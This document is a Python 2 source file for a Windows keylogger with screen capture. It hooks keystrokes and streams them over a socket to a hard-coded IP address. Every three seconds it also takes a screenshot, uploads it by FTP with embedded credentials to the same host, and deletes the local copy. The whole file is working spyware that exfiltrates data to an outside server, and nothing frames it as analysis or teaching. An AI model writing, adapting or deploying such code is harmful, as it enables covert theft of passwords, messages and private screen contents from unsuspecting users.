from multiprocessing import Process
import pyscreenshot as ImageGrab
import win32api,win32gui
import win32console
import pyHook,pythoncom
import time,datetime
import threading
import socket,ftplib
import os,wx,copy

# global variable for keystroke
lst = []

#**************************************************#
# Func : keyboardEvent hooking
def OnKeyboardEvent(event):
    global lst

    # exit if ctrl-e pressed
    if event.Ascii==5:
        _exit(1)

    # capture the keystrokes
    if event.Ascii !=0:
        keylogs=chr(event.Ascii)
        
        if event.Ascii==9:
            keylogs='[Tab]'
        elif event.Ascii==15:
            keylogs='[Enter]'
        elif event.Ascii==32:
            keylogs='[Space]'
        elif event.Ascii==8:
            keylogs='[Backspace]'
        elif event.Ascii==127:
            keylogs='[Delete]'
        
        lst.append(keylogs)



#**************************************************#
# Func : keylogger_main
def test1():
    hm=pyHook.HookManager()
    hm.KeyDown=OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()



#**************************************************#
# Func : send keystroke buffer to server
def test2():
    global lst

    # Separator for keystroke buffer
    operation = ['[Enter]', '[Space]', '[Tab]']

    try:
        client = socket.socket()
        client.connect(("211.226.43.141", 7000))
        print "Connection Success"
        
        while True:
            # send buffer when separator typed
            if (len(lst) > 1) and (lst[-1] in operation):
                tmp = copy.deepcopy(lst)
                lst = []
                tmp = "".join(tmp)
                tmp = (str)(datetime.datetime.now()) +" " + tmp
                print "\n"+tmp+":send"

                # [sender format] :
                # 2017-12-05 20:40:12.152000 hello[Enter]
                client.send(tmp.encode())
                
    except Exception, e:
        print e
        sys.exit()


#**************************************************#        
# Func : capture screenshot and send it to server

def test3():    
    while(True):
        # set dirname to windows temporary folder
        dirname = os.environ["TEMP"]

        # set filename to current time
        now = time.localtime()
        now = "%04d-%02d-%02d_%02d-%02d-%02d" % (now.tm_year, now.tm_mon, now.tm_mday, now.tm_hour, now.tm_min, now.tm_sec)
        filename = now+".png"

        # capture screenshot
        im = ImageGrab.grab()
        im.save(dirname+"/"+filename)

        # connect ftp
        ftp = ftplib.FTP()
        ftp.connect("211.226.43.141", "8021")
        ftp.login("tester", "tester")
        ftp.cwd("./image_stroke")

        # send captured file
        myfile = open(dirname+"/"+filename, "rb")
        ftp.storbinary("STOR "+filename, myfile)
        myfile.close()
        ftp.close() 

        # delete captured file
        os.remove(dirname+"/"+now+".png")

        time.sleep(3)


#**************************************************#
if __name__ == '__main__':
    t1=threading.Thread(target=test1)
    t2=threading.Thread(target=test2)
    proc = Process(target=test3)

    t1.start()
    t2.start()
    proc.start()
